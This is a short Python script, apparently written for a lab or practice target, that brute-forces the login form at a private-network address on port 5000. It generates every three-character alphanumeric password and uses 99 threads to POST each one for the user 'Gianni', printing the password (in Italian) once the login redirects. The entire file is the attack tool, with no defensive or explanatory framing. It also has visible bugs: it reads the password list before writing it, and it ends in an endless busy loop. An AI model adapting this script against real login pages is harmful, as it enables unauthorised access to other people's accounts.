import requests
import string
import threading as thr



url_init = 'http://192.168.0.127:5000/'
n_client = 0
file = open("password.txt").readlines()
chunks=[]
class threads(thr.Thread):
    def __init__(self):
        thr.Thread.__init__(self)
        self.running = True
        self.order = n_client

    def run(self):
        for passw in file[chunks[self.order]:chunks[self.order+1]]:
            passw = passw[:-1]

            payload = {'username': 'Gianni', 'password': passw, 'login':'Login' }
            page = requests.post(url_init, data = payload)

            if page.url != url_init:
                print(f"Password corretta! {passw}")
                break
        self.running = False


def genpass():
    f = open("password.txt", "w")
    lets = []
    for i in string.ascii_letters:
        lets.append(i)

    for i in range(10):
        lets.append(str(i))

    for let1 in lets:
        for let2 in lets:
            for let3 in lets:
                ris = let1 + let2 + let3 + "\n"
                f.write(ris)

    f.close()

def main():
    genpass()
    global n_client
    global chunks

    proves = []

    for i in range(0, len(file), len(file)//100):
        chunks.append(i)
    print(chunks)
    
    
    for i in range(99):
        client = threads()
        proves.append(client)
        client.start()
        n_client += 1

    while True:
        a = 1



if __name__== "__main__":
    main()